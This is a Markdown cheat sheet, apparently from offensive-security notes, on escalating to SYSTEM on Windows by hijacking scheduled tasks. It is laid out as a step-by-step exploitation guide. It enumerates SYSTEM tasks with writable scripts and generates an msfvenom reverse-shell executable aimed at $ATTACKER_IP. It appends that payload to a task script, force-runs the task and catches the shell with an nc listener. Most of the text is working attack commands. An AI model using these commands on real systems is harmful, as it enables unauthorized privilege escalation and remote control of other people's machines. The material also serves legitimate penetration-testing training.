
### <span style="color:#50FA7B">What is Task Scheduler?</span>
**Task Scheduler** is a built-in Windows tool that automatically runs programs or scripts at scheduled times.
Sometimes, a high-privileged user (like SYSTEM or Administrator) sets up a scheduled task — if you can **modify the script it runs**, you can escalate your privileges.

Find scheduled tasks run by **SYSTEM or Admin**, then check if you can **edit the script** that task runs.

## <span style="color:#8BE9FD">**Step-by-Step Exploitation**</span>
### <span style="color:#50FA7B">**1. Find Vulnerable Scheduled Tasks**</span>
```
schtasks /query /fo LIST /v > tasks.txt
type tasks.txt | findstr /i "system tasktorun"
```
*Alternative (PowerShell):*
```
Get-ScheduledTask | Where-Object { $_.Principal.UserId -eq "SYSTEM" } | Format-Table -AutoSize
```
 **Look for:**
- Tasks running as **SYSTEM or Administrator**
- Scripts/executables in **writable locations**
### <span style="color:#50FA7B">**2. Check File Permissions**</span>
```
accesschk.exe /accepteula -quv "C:\Path\To\TaskScript.ps1"
```
 You need **FILE_WRITE_DATA** or **FILE_ALL_ACCESS**
### <span style="color:#50FA7B">**3. Create Malicious Payload**</span>
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f exe -o evil.exe
```
Upload to target machine.
### <span style="color:#50FA7B">**4. Hijack the Task**</span>
#### <span style="color:#FFB86C">**Option A: Script Replacement**</span>
```
echo START /B C:\Temp\evil.exe >> "C:\Path\To\TaskScript.bat"
```
#### <span style="color:#FFB86C">**Option B: DLL Hijacking**</span>
If task uses a program that loads DLLs from writable locations.
### <span style="color:#50FA7B">**5. Wait for Execution**</span>
Tasks often run:
- At specific times (check **`schtasks`** output)
- On system events (logon, idle, etc.)
*Force run if you have permissions:*

```
schtasks /run /tn "TaskName"
```
### <span style="color:#50FA7B">**6. Catch the Shell**</span>
```
nc -nvlp 4444
```

 You should get a shell with the task's privileges (often SYSTEM)!
